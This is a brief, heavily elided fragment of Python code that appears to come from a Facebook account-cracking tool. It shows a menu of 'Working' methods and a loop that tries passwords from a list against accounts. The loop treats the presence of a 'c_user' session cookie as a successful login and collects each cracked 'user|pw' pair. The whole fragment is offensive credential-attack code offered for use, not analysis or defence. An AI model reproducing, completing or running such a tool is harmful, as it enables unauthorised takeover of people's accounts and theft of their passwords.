...
def ahmad():
    ...
    print
    print('   1<(METHOD1) ')
    print('   2<(METHOD2) Working ')
    print('   3<(METHOD3) Working ')
    print('   E<<EXIT')
    print('')
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('r\%s [Faraz-2F] %s | %s ' % (U, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
